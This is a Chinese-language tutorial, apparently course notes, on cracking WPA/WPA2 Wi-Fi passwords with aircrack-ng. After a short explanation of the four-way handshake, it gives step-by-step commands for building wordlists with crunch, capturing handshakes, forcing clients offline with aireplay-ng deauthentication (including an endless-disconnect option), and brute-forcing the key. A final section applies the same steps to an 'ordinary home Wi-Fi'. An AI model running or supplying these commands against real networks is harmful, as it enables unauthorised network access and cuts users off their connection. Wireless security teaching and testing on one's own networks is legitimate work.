# WPA-aircrack-ng渗透WPA加密

## 1.WPA概念介绍

WPA 全名 WI-FI Protected Access, 有WPA 和WPA2两个标准，是一种保护无线网络的安全协议。

WPA实现了IEEE802.11i标准的大部分，是在802.11i完备之前替代WEP的过度方案，后被WPA2取代。

由于WPA和WPA2都是基于802.11i，因此在技术层面几乎是相同的。主要区别在于WPA2要求支持更安全的CCMP。

## 2.工作原理

WPA和WPA2均使用802.11i中定义的四次握手，客户端（station）和接入点（AP）通过四次握手相互验证和协商名为成对临时密钥（Pairwise Transient Key, PTK）的会话密钥。PTK通过成对主密钥（Pairwise Master key, PMK）、AP随机数ANonce、STA随机数SNonce和双方MAC地址等计算生成。其中PMK由登陆密码等双方均已知的信息计算生成，而后续正常数据加密所使用的临时密钥（Temporal KEY, TK）即派生自PTK，各密钥、参数的关系如下：

![image-20211201175811088](https://image.201068.xyz/assets/image-20211201175811088.png)

四次握手的过程可概括如下：

（1）AP发送自己的随机数ANonce给STA

（2）STA生成随机数SNonce，计算出PTK，并将SNonce和信息完整性校验码MIC发送给AP

（3）AP收到SNonce，计算出PTK（此时双方都有PTK），将组密钥GTK加密后连同MIC发给STA

（4）STA收到GTK，安装PTK和GTK，发送ACK确认。AP收到确认后安装PTK。

![image-20211201175839342](https://image.201068.xyz/assets/image-20211201175839342.png)

## 3.wifi设置

### 1.打开wifi设置网站

```
http://192.168.1.1/                              
```

### 2.选择无线配置

![image-20211201175942316](https://image.201068.xyz/assets/image-20211201175942316.png)

### 3.选择加密方式

![image-20211201180006739](https://image.201068.xyz/assets/image-20211201180006739.png)

## 4.打造字典

### 1.crunch生成密码 

```
crunch 8 8 -t %%%%%,,, > pwd.txt
8:最小长度
8:最大长度
-t：定义输出格式
,:代表大写字母
%:代表数字
^:代表符号
14GB大字典
```

查看字典

```
tail pwd.txt
```

### 2.手工打造

```
vi passwd.txt

12456
sadasdas
SXiooo1
16330XSX
12345678
```

## 5.渗透步骤

### 1.查看网卡

```
ip a
```

### 2.开启监听模式

```
airmon-ng start wlan0
```

### 3.扫描wifi

```
airodump-ng wlan0mon
```

### 4.抓包保存

```
airodump-ng wlan0mon -c 1 --bssid D8:24:BD:79:18:0B -w wpa-1 
-c:指定信道
--bssid:AP的MAC地址
-w:保存抓包结果
```

### 5.进行冲突模式攻击

将设备踢下线，当用户重连的时候，就会抓到握手包

```
aireplay-ng -0 5 -a D8:24:BD:79:18:0B -c 18:CC:18:C5:D5:64 wlan0mon
-0：冲突攻击模式，后面跟发送次数（设置为 0，则为循环攻击，不停的断开连接，客户端无法正常上网）
-a:设置 ap 的 mac
-c：设置已连接的合法客户端的 mac
```

![image-20211201180247068](https://image.201068.xyz/assets/image-20211201180247068.png)

### 6.破解wifi

```
aircrack-ng -w /root/wifi/passwd.txt wpa-1-01.cap
```

![image-20211201180327419](https://image.201068.xyz/assets/image-20211201180327419.png)

### 7.使用大字典破解

```
aircrack-ng -w /root/wifi/pwd.txt wpa-1-01.cap
```

![image-20211201180351522](https://image.201068.xyz/assets/image-20211201180351522.png)

### 8.不指定字典破解

```
crunch 8 8 -t %%%%%,,, | aircrack-ng wpa-1-01.cap -e cisco-1809 -w -
```

![image-20211201180447549](https://image.201068.xyz/assets/image-20211201180447549.png)

![image-20211201180502673](https://image.201068.xyz/assets/image-20211201180502673.png)

## 6.渗透普通家用wifi

### 1.抓包

```
airodump-ng wlan0mon -c 1 --bssid 50:21:EC:97:BB:80 -w wpa-1 
-c:指定信道
--bssid:AP的MAC地址
-w:保存抓包结果
```

### 2.进行冲突模式攻击

将设备踢下线，当用户重连的时候，就会抓到握手包

```
aireplay-ng -0 5 -a 50:21:EC:97:BB:80 -c 18:CC:18:C5:D5:64 wlan0mon
-0：冲突攻击模式，后面跟发送次数（设置为 0，则为循环攻击，不停的断开连接，客户端无法正常上网）
-a:设置 ap 的 mac
-c：设置已连接的合法客户端的 mac
```

### 3.破解wifi

```
aircrack-ng -w /root/wifi/passwd.txt wpa-1-01.cap
```



## 7.课程小结

参考：课后笔记

